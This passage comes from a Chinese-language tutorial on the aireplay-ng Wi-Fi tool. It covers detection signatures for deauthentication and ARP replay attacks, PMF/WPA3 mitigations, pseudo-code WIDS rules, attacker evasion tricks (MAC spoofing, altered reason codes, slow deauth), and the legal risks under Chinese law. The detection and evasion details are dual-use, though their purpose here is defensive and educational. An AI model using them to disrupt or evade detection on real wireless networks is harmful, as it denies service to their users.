### 9.1 deauth 攻击是「可检测的」——这是它最大的弱点

与 [airodump-ng](airodump-ng.md) 的被动监听不同，aireplay-ng 的注入**会产生可观测的流量**。这给了蓝队机会：

| aireplay-ng 的行为 | 可检测的特征 |
| --- | --- |
| deauth 洪泛 | 单位时间内 deauth/disassoc 帧数量**异常升高** |
| 默认 reason code 7 | **reason code 分布异常集中**（正常网络的 deauth 分布是随机的） |
| 定向 deauth | 同一 BSSID 对同一 STA 反复发送 deauth |
| 广播 deauth | 一次影响大量 STA |
| 客户端重连风暴 | deauth 之后紧跟大量 Association/Reassociation 请求 |
| 注入测试（`--test`） | Probe Request 的**异常模式**（短时间内大量同源探测） |
| ARP 重放 | 同一加密 ARP 包被**反复重放**（内容相同、IV 不同） |

### 9.2 缓解措施（按有效性排序）

| 措施 | 对 deauth | 说明 |
| --- | --- | --- |
| **802.11w / PMF（管理帧保护）** | ✅ **完全阻断** | **最有效的一招**。WPA3 强制启用；WPA2 也可单独开启 |
| **WPA3-SAE** | ✅（含 PMF） | 同时解决「离线破解」和「deauth」两个问题 |
| WIPS / WIDS | 检测 | 只能发现，不能阻止 |
| AP 侧的 deauth 速率限制 | 部分缓解 | 有些企业 AP 支持 |
| 降低发射功率 | 减少攻击者可覆盖的边界 | 间接 |

**关键**：**PMF 是对 deauth 的根治性方案**。只需在 AP 上开启 `802.11w`（很多家用路由器在「无线高级设置」里有「管理帧保护」或「PMF」选项），deauth 攻击就彻底失效。

**代价**：极老的客户端可能不支持 PMF。大多数 2015 年后的设备都支持。

### 9.3 检测规则思路

```text
# 规则 1：deauth 洪泛
if count(deauth_frames, 10s) > 20
then alert "possible deauth flood"

# 规则 2：monotone reason code（工具默认 reason 7）
if count(deauth where reason_code == 7, 60s) > 50
   and distinct_stations > 5
then alert "possible automated deauth (handshake capture)"

# 规则 3：定向反复 deauth
if count(deauth, src=bssid, dst=sta, 30s) > 15
then alert "targeted deauth against STA"

# 规则 4：重连风暴（deauth 的间接后果）
if count(assoc_requests, 60s) > 100 and distinct_stations > 10
then alert "possible deauth-induced reconnect storm"

# 规则 5：ARP 重放（WEP）
if count(frames where payload_hash == H, 60s) > 100
then alert "duplicate frame replay detected (possible ARP replay attack)"

# 规则 6：注入测试特征
if count(probe_requests, src=sta, 5s) > 30 and distinct_ssid == 0
then alert "possible injection test"
```

**注意规避手段**：攻击者可以

- 伪造不同的源 MAC（让 deauth 看起来来自不同 BSSID）；
- 修改 reason code；
- 降低发送速率（慢速 deauth）。

因此更可靠的检测应该基于**总量与统计特征**，而不是简单的源地址匹配：

```text
# 更好的规则：不区分源，只看总量与重连的相关性
if (count(deauth_frames, 60s) > 50)
   and (count(assoc_requests, 60s) > 5 * baseline_assoc_rate)
then alert "deauth correlated with reconnect storm"
```

**推荐工具**：[kismet](kismet.md) 自带 WIDS 功能，可检测 deauth 洪泛、未知 BSSID、邪恶孪生等。

### 9.4 一个重要的现实

> **你无法阻止一次 deauth 攻击，除非启用 PMF。**
>
> 而且 **deauth 攻击的损害不只是「方便抓握手」**——它本身就是一次**拒绝服务攻击**：
> - 断掉 VoIP 通话；
> - 中断视频会议；
> - 影响工业/医疗设备的连接。
>
> 如果你的环境不允许这种中断（医院、工厂、关键基础设施），**PMF 不是可选项，而是必选项**。

## 10. 参考

- 官方文档：<https://www.aircrack-ng.org/doku.php?id=aireplay-ng>
- 官方 deauth 攻击说明：<https://www.aircrack-ng.org/doku.php?id=deauthentication>
- 官方站点：<https://www.aircrack-ng.org/>
- Kali 工具页：<https://www.kali.org/tools/aircrack-ng/>
- 本机手册：`man aireplay-ng`
- 本机帮助：`aireplay-ng --help`（完整参数表）
- 相关本目录：[aircrack-ng](aircrack-ng.md)（套件总览）、[airmon-ng](airmon-ng.md)、[airodump-ng](airodump-ng.md)、[wifite](wifite.md)、[reaver](reaver.md)、[kismet](kismet.md)、[bettercap](bettercap.md)
- 相关其他目录：[hashcat](../04-口令攻击/hashcat.md)、[wordlists](../04-口令攻击/wordlists.md)

## ⚠️ 法律与伦理

**`aireplay-ng` 是本目录中法律风险最高的工具**，因为它的主要功能是**主动干扰通信**。

**为什么风险高**：

1. **deauth 会真实中断他人的网络连接**——这不是「只读」操作，而是造成实际损害；
2. **注入是主动发射无线电信号**——可能违反《无线电管理条例》；
3. **广播 deauth 会中断整个网络**——所有连接该网络的设备同时掉线，包括可能与生命财产相关的设备；
4. **即使「只发 5 个」也已经造成了中断**——「影响小」不等于「不违法」。

**相关法律责任**（中国大陆）：

| 法律 | 条款 | 行为 |
| --- | --- | --- |
| 《刑法》 | 第二百八十六条 | **破坏计算机信息系统罪** —— deauth 造成网络中断属于此类 |
| 《刑法》 | 第二百八十五条 | 非法侵入计算机信息系统；非法获取计算机信息系统数据 |
| 《无线电管理条例》 | 相关条款 | 擅自使用无线电频率、干扰合法无线电业务 |
| 《网络安全法》 | 第二十七条 | 禁止任何危害网络安全的活动 |
| 《治安管理处罚法》 | 相关条款 | 干扰他人正常通信 |

**本教程仅适用于**：

- ✅ **你自己拥有的 Wi-Fi 网络与你自己的路由器**（你可以合法地中断自己的网络）
- ✅ 有**书面授权**、明确列出授权 SSID、时间窗**以及允许的干扰行为**的无线渗透测试
- ✅ 你自己搭建的隔离无线实验室（有屏蔽措施，不影响他人）
- ✅ 授权的 CTF 靶场

**严禁**：

- ❌ 对邻居、公司、公共场所的任何 Wi-Fi 执行 deauth
- ❌ 在授权范围之外的任何 SSID 上做任何注入
- ❌ 为了「看看效果」而测试他人网络
- ❌ 使用广播 deauth 影响整个网络（即使在授权范围内也应优先用定向）

**推荐的替代学习方式（不需要注入）**：

```text
1. 用 aireplay-ng --test 只测试你自己的网卡能力（不会影响到别人）
2. 用你自己的手机「关 Wi-Fi 再开」，自然产生握手 —— 完全不需要 deauth
3. 分析已有的抓包文件（aircrack-ng / tshark / wireshark）
4. 用 PMKID 方式（对目标影响较小，且不需要 deauth）
```

**如果你的目的是学习无线安全**：请使用上述替代方式。它们覆盖了 90% 的知识点，而且**完全不会伤害任何人**。
